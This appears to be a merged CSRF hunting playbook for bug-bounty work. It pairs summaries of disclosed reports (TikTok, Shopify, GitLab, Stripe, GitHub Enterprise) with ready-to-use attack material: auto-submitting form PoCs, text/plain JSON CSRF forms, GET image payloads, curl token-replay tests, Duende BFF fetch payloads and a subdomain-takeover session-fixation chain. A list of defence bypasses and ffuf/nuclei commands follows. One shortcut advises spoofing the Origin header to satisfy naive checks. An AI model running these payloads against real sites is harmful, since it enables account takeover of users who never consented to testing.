> A missing CSRF protection and open redirect vulnerability was reported in the TikTok Careers portal single sign on flow which is used by applicants to apply for TikTok positions. This flaw was quickly remediated and does not impact TikTok.com or mobile application. We thank @lauritz for reporting this vulnerability to our team and for confirming the resolution. I wrote a short blog post that covers this report.

### CSRF on connecting Paypal as Payment Provider

`#807924` · Shopify · $0 · medium · 2020-04-10 · ▲304
> Hi, I think there is a weak csrf protection on adding paypal as the payment provider, but the protection is not good. When user try to add paypal as payment provider, they will make this GET request https://h60ngalog.myshopify.com/admin/payments/complete paypal incontext oauth/41?merchantId=MTU4MzAzMDUwNDowMTBmMDZkYjg1NzM0YjQ4NWVkMDk1YzQ1YWYxY2ZlNw%3D%3D&merchantIdInPayPal=5NS8DHQCFGT84&permissionsGranted=true&accountStatus=BUSINESS…

### Account Takeover using Linked Accounts due to lack of CSRF protection

`#463330` · Rockstar Games · $0 · high · 2019-02-20 · ▲238
> In this report, the researcher found a weakness in our third-party account linking process. They were able to create a malicious link that, if clicked by the victim, would under certain conditions give the attacker access to the victim's Social Club account. This issue has now been fixed.

### Periscope android app deeplink leads to CSRF in follow action

`#583987` · X / xAI · $1,540 · low · 2020-02-21 · ▲224
> This issue is mainly in the Periscope Android app against CSRF follow action using deeplink.

### Take over of accounts created using Google or Facebook

`#442901` · Khan Academy · $0 · critical · 2019-05-17 · ▲184
> When a user creates an account using Google or Facebook and does not set an additional password, it is possible to set their passwords via CSRF. Since the account is created using a social media account, no existing password check is needed and the CSRF check on the endpoint is broken. To reproduce, create an account with Google or Facebook and make account load the attached HTML file.

### Shortcut: a raw HTTP client beats a real cross-origin page for header-check CSRF

A raw HTTP client (curl, Burp Repeater, any scripting client) is not a browser: it will send
whatever `Origin`/`Referer` header VALUE you set, from any path, on the same connection as your
authenticated cookie. Many apps that claim to defend against CSRF only do a naive **string check**
on the incoming `Origin`/`Referer` header (does it contain/equal some expected value?) rather than
real same-origin enforcement — you can satisfy that check directly by setting the header, with no
actual cross-site delivery (hosting an HTML page, a headless browser) required. This is faster and
more reliable than building a real attacker page for this exact pattern:
```
POST /profile HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Origin: https://a-domain-the-app-treats-as-trusted-or-attacker-controlled.example
Cookie: <authenticated session>

username=csrf_poc
```
If some text names a SPECIFIC origin/domain as the "expected" attacker page, that literal value is
often exactly what the server's check is looking for — try it verbatim in `Origin` (fall back to
`Referer` if `Origin` alone doesn't flip it). Only build a real cross-origin page (actual browser
delivery) when the target does genuine SameSite/fetch-based origin enforcement that a spoofed header
can't satisfy.

### URL Patterns

```
/oauth/authorize?RelayState=
/accounts/link
/import/friends
/api/v*/heartbeat
/api/v*/collect
/monitoring/* (Grafana, Prow, Prometheus)
/auth/saml/callback
/connect/* (social integrations)
```

### JS / DOM Patterns

```javascript
// Static or predictable CSRF tokens
meta[name="csrf-token"]   // grep if value changes across sessions
authenticity_token        // Rails — check if reused across page loads

// JSON endpoints without Content-Type enforcement
fetch('/api/heartbeat', {method: 'POST', body: JSON.stringify(data)})

// No CSRF token in form at all
<form method="POST" action="/accounts/link">  // no hidden token field
```

### Scenario 1: Social Account Takeover via Import Friends (Rockstar Games)

An attacker crafted a malicious page targeting the "Import Friends" OAuth integration. When an authenticated SocialClub user visited the page, the CSRF triggered the OAuth token exchange with an attacker-controlled social account. The victim's SocialClub account became permanently linked to the attacker's Facebook/social identity, enabling full account access without the victim's knowledge. Rated high severity due to complete account compromise path.

### Scenario 2: Facebook Account Hijacking via Oculus Integration CSRF

During Oculus-Facebook account linking, the OAuth callback lacked proper CSRF state validation. An attacker could craft a URL that, when loaded by an authenticated Facebook user who had started the Oculus linking flow, would associate the attacker's Oculus device credentials with the victim's Facebook account. The attacker then had persistent access to the victim's Facebook profile through the Oculus app. The attack required only that the victim click a link while logged into Facebook.

### Scenario 3: JSON API CSRF on Heartbeat/Activity Tracking

A POST endpoint accepting `application/json` was assumed CSRF-safe by developers. A researcher crafted an HTML form using `enctype="text/plain"` with an input name designed to produce syntactically valid JSON when submitted. The browser sent the request cross-origin without a preflight (no custom headers, `text/plain` is a simple request), cookies were attached, and the server processed the JSON body as legitimate — silently logging attacker-controlled activity data under the victim's account identity.

---

### Disclosed Report Citations (Backfill +5 — 2020-2024)

The following real, verified bug-bounty / coordinated-disclosure cases extend this skill. Four cases chain CSRF to full ATO; all five are modern (SameSite-era).

11. **Argo CD — SameSite=Lax bypass via sibling subdomain + Content-Type abuse (CVE-2024-22424)** ([GHSA-92mw-q256-5vwg](https://github.com/argoproj/argo-cd/security/advisories/GHSA-92mw-q256-5vwg) · [Writeup](https://blog.calif.io/p/argo-cd-csrf))
    - Subclass: SameSite=None/Lax misconfig chain — same parent-domain bypass + JSON CSRF via missing Content-Type enforcement
    - Payload: hosted on `marketing.victim.com`, target `argocd.internal.victim.com` → `fetch('https://argocd.internal.victim.com/api/v1/applications', {method:'POST', credentials:'include', body:'{"metadata":{"name":"pwn"},"spec":{"source":{"repoURL":"https://attacker/manifest.git"}}}'})`
    - Root cause: Argo CD did not enforce `Content-Type: application/json`, and SameSite=Lax is moot when the attacker controls any sibling subdomain of the shared parent
    - Year: 2023 reported, fixed Jan 2024 in 2.7.16/2.8.8/2.9.4

12. **GitLab — CSRF on `/api/graphql` via GET-converted mutations** ([H1 #1122408](https://hackerone.com/reports/1122408))
    - Subclass: GET-state-changing endpoint (GraphQL mutations through GET requests)
    - Payload: `<img src="https://gitlab.com/api/graphql?query=mutation{createSnippet(input:{title:%22x%22,visibilityLevel:public,content:%22pwn%22}){snippet{id}}}">`
    - Root cause: backend skipped `X-CSRF-Token` validation when the HTTP method was GET; GraphQL accepted mutations via `?query=mutation{...}` query string
    - Year: 2021 — **$3,370**

13. **Stripe Dashboard — CSRF middleware disabled by code change** ([H1 #1483327](https://hackerone.com/reports/1483327))
    - Subclass: framework misconfiguration — middleware globally disabled
    - Payload: `<form method="POST" action="https://dashboard.stripe.com/account/settings" enctype="text/plain"><input name='{"business_name":"pwned","x":"' value='"}'></form>` + auto-submit script
    - Root cause: 2022-02-14 deploy inadvertently turned off CSRF middleware across all Stripe Dashboard endpoints
    - Year: 2022 — **$5,000** ($2,500 × 2 researchers)

14. **GitHub Enterprise Server — CSRF bypass via path traversal (CVE-2022-23732)** ([H1 #1497169](https://hackerone.com/reports/1497169))
    - Subclass: CSRF token validation bypass (path traversal smuggles request past token check)
    - Payload: `<form method=POST action="https://ghes.victim.com/setup/api/start/..%2f..%2fadmin%2fusers"><input name=login value=attacker></form>`
    - Root cause: router matched the post-traversal path for execution but pre-traversal path for CSRF-protection scope, so the protected endpoint was reached without a valid token
    - Year: 2022 — **$10,000**

15. **HackerOne self — CSRF on social account linking → ATO** ([H1 #1727221](https://hackerone.com/reports/1727221))
    - Subclass: account-link CSRF (social provider attach without state binding)
    - Payload: `<img src="https://hackerone.com/users/social_accounts/google?code=ATTACKER_CODE&state=PREDICTABLE">` — victim's browser completes attacker-initiated link flow
    - Root cause: token bound to OAuth-link callback was either reused across attempts or not user-bound, so attacker-issued link callbacks were accepted on the victim's session — attacker's Google account becomes a valid login path = ATO
    - Year: 2022 — informational scope on H1 self-program, but public PoC

---

### Duende BFF — Role-Partitioned Antiforgery (2024-2026 surface)

Duende BFF (commercial successor to IdentityServer4) is the canonical ASP.NET Core BFF library for SPAs. Its antiforgery primitive is **non-standard and not user-bound**: instead of ASP.NET Core's per-session/per-user double-submit token, Duende only requires the presence of a **static header `X-CSRF: 1`** on every BFF-mapped endpoint. The header value is identical for every caller; it exists only to force a CORS preflight on cross-origin calls. This collapses CSRF defence to "same-origin + session cookie present" — and produces several distinct attack patterns when one BFF serves multiple privilege partitions.

**Architecture primer:** browser↔BFF authenticates via an encrypted HttpOnly session cookie (default `.AspNetCore.Cookies`); BFF↔API uses OAuth tokens cached server-side. Endpoints registered via `MapBffManagementEndpoints` / `MapRemoteBffApiEndpoint` / `MapBffApiEndpoint` enforce `X-CSRF: 1` and session presence — nothing else. ([docs.duendesoftware.com/bff](https://docs.duendesoftware.com/bff/), [Duende blog Mar 2025](https://duendesoftware.com/blog/20250325-understanding-antiforgery-in-aspnetcore))

### Attack class 1 — `X-CSRF: 1` is not user-bound, so cross-role replay succeeds same-origin

When a single BFF serves `/admin/*` and `/user/*` partitions, the antiforgery primitive cannot distinguish role-A from role-B. Any same-origin script that can land an XHR with `X-CSRF: 1` and the victim's session cookie reaches admin endpoints if the victim has the admin role. Stock ASP.NET Core antiforgery (which binds the token to `HttpContext.User.Identity.Name` and rejects on identity change) does the right thing here; Duende BFF does not. ([docs.duendesoftware.com/bff/fundamentals/options](https://docs.duendesoftware.com/bff/fundamentals/options/))

**Payload shape:** from a logged-in low-priv session, `fetch('/bff/admin/users/delete?id=42', {credentials:'include', headers:{'X-CSRF':'1'}})` — succeeds if the victim's session happens to hold the admin role and the attacker can land any same-origin script (self-XSS, subdomain-takeover JS, dependency-confusion).

### Attack class 3 — Cookie-domain wildcarding turns subdomain takeover into session fixation

BFF session cookies default to host-only, but developers commonly override with `options.Cookie.Domain = ".example.com"` to share login across `app.example.com` and `admin.example.com`. This drops the `__Host-` prefix protection. Take over `legacy.example.com` (CNAME to deprovisioned Heroku/S3) → set `Set-Cookie: .AspNetCore.Cookies=<attacker_session>; Domain=.example.com` → victim hits `app.example.com` carrying attacker's session = session-fixation ATO. ([nestenius.se BFF cookie hardening](https://nestenius.se/net/bff-in-asp-net-core-3-the-bff-pattern-explained/))

### Evidence strength

No Duende.BFF-direct CVE exists as of 2026-05. The three classes above are **design-level / documented behaviour** that becomes a live finding when paired with a co-resident primitive (same-origin script execution, SignalR carve-out, or subdomain takeover). Report severity should lean on the chain's business impact rather than CVE citation. Adjacent confirmed CVEs in the Duende ecosystem: CVE-2025-26620 (`Duende.AccessTokenManagement` race), CVE-2024-51987 (`Duende.AccessTokenManagement.OpenIdConnect` incorrect-token-after-refresh), CVE-2024-39694 (`Duende.IdentityServer` open redirect). ([Duende advisories on GitHub](https://github.com/advisories?query=duende))

### Hunting checklist

1. `curl https://target/bff/user -H 'X-CSRF: 1' -b '<session>'` — dumps the full claim set including internal IDs, role names, tenant IDs (info disclosure on its own).
2. Inspect `Set-Cookie` on `/bff/login` callback — flag `Domain=` attribute (vs `__Host-` prefix); flag missing `Secure`/`HttpOnly`.
3. From a low-priv session, replay admin-partition POSTs with `X-CSRF: 1` to confirm no per-role token binding.
4. Enumerate SignalR/WS hubs (`/hubs/*`, `/signalr/*`) — open without `X-CSRF`; if 101 Switching Protocols, CSWSH-style attacks viable.
5. Subdomain inventory + DNS-takeover scan for any `*.example.com` if BFF cookie has `Domain=.example.com`.

---

### Basic CSRF PoC (Form POST)

```html
<html>
<body onload="document.forms[0].submit()">
  <form method="POST" action="https://target.com/api/v1/account/link">
    <input type="hidden" name="provider" value="attacker_account_id" />
    <input type="hidden" name="token" value="oauth_token_here" />
  </form>
</body>
</html>
```

### curl: Test CSRF token omission

```bash
# Capture a valid request, then replay without token
curl -s -X POST https://target.com/settings/email \
  -H "Cookie: session=YOUR_SESSION" \
  -d "email=attacker@evil.com" \
  -v 2>&1 | grep -E "HTTP|location|error"
```

### curl: Test token reuse across sessions

```bash
# Get token from session A
TOKEN_A=$(curl -s https://target.com/settings -H "Cookie: session=SESSION_A" \
  | grep -oP 'authenticity_token[^"]*value="\K[^"]+')

# Use token A in session B's request
curl -s -X POST https://target.com/settings/update \
  -H "Cookie: session=SESSION_B" \
  -d "authenticity_token=$TOKEN_A&email=test@test.com" \
  -v
```

### Grafana CVE-2022-21703 version check

```bash
curl -s https://monitoring.target.com/api/health | jq '.version'
# Vulnerable: < 8.3.5, < 8.4.3, < 7.5.15
```

---

### Defense: SameSite=Lax cookies

**Bypass:** Top-level navigation GET requests still work. If the sensitive action can be triggered via GET (or if a redirect chain converts POST→GET), Lax doesn't protect it. Also: subdomains can still set cookies for parent domain.

### Defense: CSRF token present

**Bypasses:**
- Token is static per session — steal via XSS, Referer leakage, or cached page
- Token not validated server-side — just remove it and try
- Token validated by length/format only — submit a fake but correctly-formatted value
- Token tied to session but session is predictable

### Defense: `Content-Type: application/json` enforcement

**Bypass:** Use `text/plain` enctype with crafted form input names that produce valid JSON. Server receives JSON body, skips CORS preflight.

### Defense: Referer/Origin header check

**Bypasses:**
- Null Origin: use sandboxed iframe (`<iframe sandbox="allow-scripts allow-forms">`)
- Subdomain bypass: if `*.target.com` is trusted and you have XSS on any subdomain
- Referer stripping: HTTPS→HTTP transitions strip Referer header
- Weak matching: `target.com.evil.com` passes naive string matching

### Defense: Double-submit cookie pattern

**Bypass:** If attacker can set cookies (subdomain takeover, cookie injection via HTTP), they can set both the cookie and the form field to matching attacker-controlled values.

### Defense: Custom request header (e.g., `X-Requested-With`)

**Bypass:** Simple requests (form POST, `text/plain`) don't trigger preflight and can't set custom headers — but some servers only check for header *presence*, not value, and some frameworks accept requests without it.

---

### Mobile-app CSRF via custom-scheme deeplink

CSRF is not browser-only. For targets with a mobile app, enumerate exported deeplink / custom-scheme handlers (`scheme://action` from the Android manifest / iOS `Info.plist`) and test whether opening one performs a state-changing action (follow, link, purchase) using the app's ambient session with no CSRF token — deliverable to a victim by a plain link or a QR code. Disclosed: reports/583987, reports/805073.

## Companion methodology (merged, deduplicated)

Full text of every non-SKILL.md methodology file from the contributing skills — payload banks, technique references, reconnaissance and attack-class guides.

### Companion: hunting / references/payloads.md

# CSRF — Combined Field Guide — Payload reference

Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete payload.

---

## Payloads & probes



- Form -> `<form action=https://target/email method=POST><input name=email value=attacker@x>`

- JSON -> `<form enctype=text/plain><input name='{"email":"attacker@x","x":"' value='"}'>`

- GET -> `<img src=https://target/settings?email=attacker@x>`

- Method override -> `_method=POST` in a GET/form request



## Payload fragments observed



Recurring payloads from this class's writeups. Adapt, don't paste blindly.



| Seen | Fragment |

|---:|---|

| 3× | `new.cs.money{.withgoogle.com` |

| 2× | `www.pscp.tv/<user-id>/follow` |

| 2× | `new.cs.money{.attacker.com` |

| 2× | `http://localhost$something.io` |

| 2× | `<html> / <!-- CSRF PoC - generated by Burp Suite Professional --> / <body> / <script>history.pushState('', '', '/')</script> / <form action=` |

| 1× | `MTU4MzAzMDUwNDowMTBmMDZkYjg1NzM0YjQ4NWVkMDk1YzQ1YWYxY2ZlNw%3D%3D` |

| 1× | `pscp://user/<user-id> or pscpd://user/<user-id>` |

| 1× | `{F1976253} / 3. Following the redirection takes us to the authorization page of the service provider / {F1976255} / If we choose to Authoriz` |

| 1× | `This endpoint validates the code received from Github, the backend relies on the ***state*** parameter to determine to which user should the` |

| 1× | `Location: https://slack.com/oauth/authorize / ?client_id=2174110321.11522100978 / &redirect_uri=https%3A%2F%2Fhackerone.com%2Fauth%2Fslack%2` |

| 1× | `<meta name="referrer" content="origin" />` |

| 1× | `$this->request->getHeader("Authorization")` |

| 1× | `GET /2.0/repositories/%7B766210f9-9bec-4010-9f4d-917b06661c0c%7D HTTP/2 / Host: api.bitbucket.org / User-Agent: curl/7.79.1 / Accept: */* /` |

| 1× | `gitlab@gitlab.com` |

| 1× | `https://academy.acronis.com/#/account/edit/account_id/<your_id>` |

| 1× | `<img>` |

| 1× | `__utmz=123456.123456789.11.2.utmcsr=[HOST]\\|utmccn=(referral)\\|utmcmd=referral\\|utmcct=[PATH]` |

| 1× | `__utmz=123456.123456789.11.2.utmcsr=blackfan.ru\\|utmccn=(referral)\\|utmcmd=referral\\|utmcct=/path/` |

| 1× | `https://eu1.badoo.com/google/verify.phtml?rt=<State_param_value>&code=<Code_returned_from_google>` |

| 1× | `GET /u/x.css HTTP/1.1 / Host: try.discourse.org / <meta name="csrf-token" content="aYBW0N/1nfI1PHBa24YNx+...+BJJX+Fg==" />` |



## Parameters observed



`email` · `code` · `state` · `id` · `page` · `redirect_uri` · `authenticity_token` · `client_id` · `scope` · `nonce` · `sort_type` · `sort_direction` · `limit` · `password` · `act` · `subject` · `report_id` · `view` · `text_query` · `response_type`



## Wordlists



Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.



| File | Entries |

|---|---:|

| `~/.local/share/hackerone-reports/wordlists/paths_csrf.txt` | 150 |

| `~/.local/share/hackerone-reports/wordlists/params_csrf.txt` | 150 |

| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |

| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |



```sh

W=~/.local/share/hackerone-reports/wordlists

ffuf -u https://target/FUZZ -w $W/paths_csrf.txt \

     -mc all -fc 404 -fs 0 -rate 40

ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_csrf.txt \

     -mr 'canary|error|invalid|not found' -rate 40

```



## Nuclei



Confirm with a real cross-origin PoC; scanner hits need a browser check.



```sh

nuclei -u https://target -tags csrf \

       -severity low,medium,high,critical -rl 40 -o nuclei_csrf.txt

nuclei -u https://target -t ~/nuclei-templates/http/vulnerabilities/generic \

       -rl 40 -o nuclei_csrf_generic.txt

# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'

```



Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.



## Payload & Detection Patterns



### Basic CSRF PoC (Form POST)

```html

<html>

<body onload="document.forms[0].submit()">

  <form method="POST" action="https://target.com/api/v1/account/link">

    <input type="hidden" name="provider" value="attacker_account_id" />

    <input type="hidden" name="token" value="oauth_token_here" />

  </form>

</body>

</html>

```



### JSON CSRF via text/plain (bypasses Content-Type check)

```html

<html>

<body onload="document.forms[0].submit()">

  <form method="POST" action="https://target.com/api/heartbeat"

        enctype="text/plain">

    <!-- browser sends: {"status":"ok","x":"=padding"} -->

    <input type="hidden" name='{"status":"ok","x":"' value='padding"}' />

  </form>

</body>

</html>

```



### curl: Test CSRF token omission

```bash

# Capture a valid request, then replay without token

curl -s -X POST https://target.com/settings/email \

  -H "Cookie: session=YOUR_SESSION" \

  -d "email=attacker@evil.com" \

  -v 2>&1 | grep -E "HTTP|location|error"

```



### curl: Test token reuse across sessions

```bash

# Get token from session A

TOKEN_A=$(curl -s https://target.com/settings -H "Cookie: session=SESSION_A" \

  | grep -oP 'authenticity_token[^"]*value="\K[^"]+')



# Use token A in session B's request

curl -s -X POST https://target.com/settings/update \

  -H "Cookie: session=SESSION_B" \

  -d "authenticity_token=$TOKEN_A&email=test@test.com" \

  -v

```



### Grep patterns for recon

```bash

# Find CSRF token fields in HTML responses

grep -Eo 'name="(csrf|_token|authenticity_token|csrfmiddlewaretoken)"[^>]*value="[^"]+"'



# Find forms without CSRF tokens

grep -B5 -A20 '<form method="[Pp][Oo][Ss][Tt]"' response.html | grep -L "csrf\|token\|nonce"



# Check SameSite in response headers

curl -sI https://target.com/login | grep -i "set-cookie"



# Find RelayState parameters

grep -r "RelayState" --include="*.js" .

```



### Grafana CVE-2022-21703 version check

```bash

curl -s https://monitoring.target.com/api/health | jq '.version'

# Vulnerable: < 8.3.5, < 8.4.3, < 7.5.15

```



---

### Companion: hunting / references/techniques.md

# CSRF — Combined Field Guide — Technique reference

Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete technique.

---

## Quick wins



Start here. These are the highest-yield tests for this class.



- Find state-changing requests and check for anti-CSRF tokens and SameSite cookies.

- Remove the token, blank it, reuse another session's token, and try a fixed token.

- Try GET, form POST, text/plain JSON, multipart, and method override.

- Check email/password change, OAuth consent, and login CSRF.

- Look for subdomain XSS or cookie scope that enables CSRF.



## Bypass tricks



- Token not bound to session; token from another account accepted.

- SameSite=Lax bypass via top-level GET or 2-minute window.

- CORS misconfig allowing credentialed cross-origin requests.

- Bypass token check by changing content-type or removing the parameter.



## Deeper checklist



- Identify state-changing requests and check for anti-CSRF tokens and SameSite cookies.

- Test token validation: missing token, empty token, token from another session, fixed token.

- Try method/content-type tricks: GET, POST forms, text/plain JSON, multipart, method override.

- Check CORS misconfigurations that allow credentialed cross-origin reads/writes.

- Test login CSRF, logout CSRF, OAuth state CSRF, and email-change CSRF.

- Look at subdomain/XSS-assisted CSRF where cookies are scoped to the parent domain.

- Build a minimal PoC page and confirm the state change on a victim account.



## Techniques from real reports



One concrete lesson per report (mined from the writeup), newest and most-upvoted first. Read 5–10 before testing.



- **[CSRF] TikTok Careers Portal Account Takeover** — `#1010522` · TikTok · $0 · ▲366

  > If you have any feedback, feel free to ping me at [Twitter](https://twitter.com/ lauritz ).

- **CSRF on connecting Paypal as Payment Provider** — `#807924` · Shopify · $0 · ▲304

  > `https://h60ngalog.myshopify.com/admin/payments/complete paypal incontext oauth/41?merchantId=MTU4MzAzMDUwNDowMTBmMDZkYjg1NzM0YjQ4NWVkMDk1YzQ1YWYxY2ZlNw%3D%3D&merchantIdInPayPal=5NS8DHQCFGT84&permissionsGranted=true&accountStatus=BUSINESS…

- **Periscope android app deeplink leads to CSRF in follow action** — `#583987` · X / xAI · $1,540 · ▲224

  > + It means we can use ` pscp://user/<user-id or pscpd://user/<user-id `

- **Take over of accounts created using Google or Facebook** — `#442901` · Khan Academy · $0 · ▲184

  > Since the account is created using a social media account, no existing password check is needed and the CSRF check on the endpoint is broken.

- **Improper CSRF token validation allows attackers to access victim's accounts linked to Hackerone** — `#1727221` · HackerOne · $0 · ▲168

  > Then it redirects us to the callback endpoint which sends a postmessage to the embedded iframe to validate the integration on the client side.

- **CSRF protection bypass in GitHub Enterprise management console** — `#1497169` · GitHub · $10,000 · ▲152

  > [CVE-2022-23732](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23732)

- **Slack integration setup lacks CSRF protection** — `#170552` · HackerOne · $2,500 · ▲149

  > Cross-site Request Forgery in the `Integrations` (https://hackerone.com/[YOUR TEAM]/integrations) feature for teams.

- **CSRF token validation system is disabled on Stripe Dashboard** — `#1483327` · Stripe · $0 · ▲113

  > @d sharad discovered that due to a code change deployed on 2/14/2022, Cross Site Request Forgery (CSRF) protection was disabled in the Stripe Dashboard.

- **Referer Leakage Vulnerability in  socialclub.rockstargames.com/crew/ leads to FB'S OAuth token theft.** — `#787160` · Rockstar Games · $0 · ▲112

  > The Open Redirect is the subject of a separate report; in this report, we addressed the problem by strengthening the Referer header policy with `<meta name="referrer" content="origin" / `.

- **Cross-Site Request Forgery** — `#2041007` · ownCloud · $0 · ▲111

  > I think the cause of this vulnerability is the second condition of https://github.com/owncloud/core/blob/master/lib/private/AppFramework/Middleware/Security/SecurityMiddleware.php L145, because the the value of `$this- request- getHeader("Authorization")` is…

- **Cross-Site Request Forgery (CSRF) vulnerability on API endpoint allows account takeovers** — `#419891` · Khan Academy · $0 · ▲111

  > The `/signup/email` API endpoint at [khanacademy.org](https://khanacademy.org) is vulnerable to Cross-Site Request Forgery (CSRF) attacks, allowing takeovers of accounts associated with unconfirmed email addresses.

- **CSRF Vulnerability on https://signin.rockstargames.com/tpa/facebook/link/** — `#474833` · Rockstar Games · $0 · ▲104

  > In this report, the researcher identified a Cross-Site Request Forgery vulnerability that could have allowed attackers to link a Facebook account to another user's Social Club account, and thus gain the ability to log in as the victim.

- **Account takeover due to insufficient URL validation on RelayState parameter** — `#1923672` · GitLab · $2,450 · ▲99

  > https://bitbucket.org/site/oauth2/authorize?client id=b9jLmh8WCLZPBAwWba&redirect uri=https%3A%2F%2Fgitlab.com%2Fusers%2Fauth%2Fbitbucket%2Fcallback&response type=token&state=DoesNotMatter

- **One Click Account takeover using Ouath CSRF bypass by adding Null byte %00 in state parameter on  www.streamlabs.com** — `#1046630` · Logitech · $0 · ▲99

  > Allow twitch access and once you see a get request in burp with host streamlabs.com and parameters code, scope and state then generate CSRF PoC

- **CSRF Account Takeover** — `#1253462` · TikTok · $0 · ▲95

  > A Cross-Site Request Forgery (CSRF) vulnerability was found on a TikTok endpoint which could have resulted in a full account takeover.

- **CSRF to HTML Injection in Comments** — `#428019` · WordPress · $0 · ▲95

  > More [details are available on the RIPS blog](https://blog.ripstech.com/2019/wordpress-csrf-to-rce/).

- **CSRF in Account Deletion feature (https://www.flickr.com/account/delete)** — `#615448` · Flickr · $0 · ▲92

  > While testing the account deletion feature, I noticed that there were no CSRF token :/ Later found out it was because of the new login flow.

- **Account takeover at https://try.discourse.org due to no CSRF protection in connecting Yahoo account** — `#423022` · Discourse · $0 · ▲89

  > There is an option in https://try.discourse.org/u/testh1ay/preferences/account to connect our Yahoo account.

- **CSRF on /api/graphql allows executing mutations through GET requests** — `#1122408` · GitLab · $3,370 · ▲88

  > Mutations are `edit` or `create` queries used in Graphql.

- **CSRF token validation system is disabled on Stripe Dashboard** — `#1493437` · Stripe · $2,500 · ▲87

  > @rodolfomarianocy discovered that due to a code change deployed on 2/14/2022, Cross Site Request Forgery (CSRF) protection was disabled in the Stripe Dashboard.

- **CSRF leads to Account takeover** — `#2699029` · U.S. Dept Of Defense · $0 · ▲87

  > Vulnerable domain and endpoint : https://██████████/account/profile/edit

- **Login CSRF vulnerability on hackerone.com** — `#834366` · HackerOne · $500 · ▲84

  > We found a CSRF token bypass on the Hacker One login page.

- **Delete any user's added Email,Telephone,Fax,Address,Skype via csrf in (https://academy.acronis.com/)** — `#709537` · Acronis · $0 · ▲82

  > - navigate to `https://academy.acronis.com/ /account/edit/account id/<your id `

- **XSSI on refer.xoom.com allows stealing email addresses and posting to Twitter on behalf of victim** — `#450796` · PayPal · $3,500 · ▲81

  > This included the email addresses being used and, in extreme cases, tokens allowing Xoom access to post on a user’s Twitter.

- **CSRF in ticket function** — `#1890310` · TikTok · $0 · ▲80

  > I found this issue by removing the CsrfToken from the header and converting the content type from `JSON` to `x-www-form-urlencoded`.

- **Account takeover by changing email** — `#538800` · Khan Academy · $0 · ▲80

  > Attacker then lures a new KA user to visit a URL linking to a page that sends a `POST` request to `/signup/email` with the POST body : `casing=camel&email=ATTACKER EMAIL`.

- **CSRF protection bypass on TikTok Webcast Endpoints** — `#1543234` · TikTok · $2,500 · ▲79

  > API on TikTok Webcast endpoints prevent CSRF by validating the Origin header which indicates the source of the request.

- **CSRF protection on OIDC login is broken** — `#1878381` · Nextcloud · $500 · ▲77

  > So I assume the bug is also the same https://github.com/nextcloud/user oidc/blob/main/lib/Controller/Id4meController.php L175-L181

- **Japan - CSRF in webapp.starbucks.co.jp with user interaction could leak an access token if the user was not using Chrome** — `#1113559` · Starbucks · $0 · ▲77

  > elber discovered a CSRF in webapp.starbucks.co.jp leaked an access token if an authenticated user opened a crafted HTML file in a browser other than Chrome which has Same Site Attribute for the cookie set by default.

- **CSRF on Periscope Web OAuth authorization endpoint** — `#215381` · X / xAI · $0 · ▲74

  > At minimum, I found endpoints that allow creating a broadcast (https://public-api.periscope.tv/v1/broadcast/create), tweeting it (https://public-api.periscope.tv/v1/broadcast/publish) and deleting a broadcast…



## Case studies



### [CSRF] TikTok Careers Portal Account Takeover

`#1010522` · TikTok · $0 · high · 2020-12-15 · ▲366

> A missing CSRF protection and open redirect vulnerability was reported in the TikTok Careers portal single sign on flow which is used by applicants to apply for TikTok positions. This flaw was quickly remediated and does not impact TikTok.com or mobile application. We thank @lauritz for reporting this vulnerability to our team and for confirming the resolution. I wrote a short blog post that covers this report.



### CSRF on connecting Paypal as Payment Provider

`#807924` · Shopify · $0 · medium · 2020-04-10 · ▲304

> Hi, I think there is a weak csrf protection on adding paypal as the payment provider, but the protection is not good. When user try to add paypal as payment provider, they will make this GET request https://h60ngalog.myshopify.com/admin/payments/complete paypal incontext oauth/41?merchantId=MTU4MzAzMDUwNDowMTBmMDZkYjg1NzM0YjQ4NWVkMDk1YzQ1YWYxY2ZlNw%3D%3D&merchantIdInPayPal=5NS8DHQCFGT84&permissionsGranted=true&accountStatus=BUSINESS…



### Account Takeover using Linked Accounts due to lack of CSRF protection

`#463330` · Rockstar Games · $0 · high · 2019-02-20 · ▲238

> In this report, the researcher found a weakness in our third-party account linking process. They were able to create a malicious link that, if clicked by the victim, would under certain conditions give the attacker access to the victim's Social Club account. This issue has now been fixed.



### Periscope android app deeplink leads to CSRF in follow action

`#583987` · X / xAI · $1,540 · low · 2020-02-21 · ▲224

> This issue is mainly in the Periscope Android app against CSRF follow action using deeplink.



### Take over of accounts created using Google or Facebook

`#442901` · Khan Academy · $0 · critical · 2019-05-17 · ▲184

> When a user creates an account using Google or Facebook and does not set an additional password, it is possible to set their passwords via CSRF. Since the account is created using a social media account, no existing password check is needed and the CSRF check on the endpoint is broken. To reproduce, create an account with Google or Facebook and make account load the attached HTML file.



## Query the corpus



```sh

python3 ~/.local/share/hackerone-reports/h1.py search "<keyword>" --class csrf --limit 20

python3 ~/.local/share/hackerone-reports/h1.py stats --class csrf

python3 ~/.local/share/hackerone-reports/h1.py show <id> --full

```



Search by technology, endpoint, parameter, or program. Examples:



```sh

python3 ~/.local/share/hackerone-reports/h1.py search "wordpress" --class csrf

python3 ~/.local/share/hackerone-reports/h1.py search "reset token" --class csrf --min-bounty 1000

```



## Bypass Techniques



### Defense: SameSite=Lax cookies

**Bypass:** Top-level navigation GET requests still work. If the sensitive action can be triggered via GET (or if a redirect chain converts POST→GET), Lax doesn't protect it. Also: subdomains can still set cookies for parent domain.



### Defense: CSRF token present

**Bypasses:**

- Token is static per session — steal via XSS, Referer leakage, or cached page

- Token not validated server-side — just remove it and try

- Token validated by length/format only — submit a fake but correctly-formatted value

- Token tied to session but session is predictable



### Defense: `Content-Type: application/json` enforcement

**Bypass:** Use `text/plain` enctype with crafted form input names that produce valid JSON. Server receives JSON body, skips CORS preflight.



### Defense: Referer/Origin header check

**Bypasses:**

- Null Origin: use sandboxed iframe (`<iframe sandbox="allow-scripts allow-forms">`)

- Subdomain bypass: if `*.target.com` is trusted and you have XSS on any subdomain

- Referer stripping: HTTPS→HTTP transitions strip Referer header

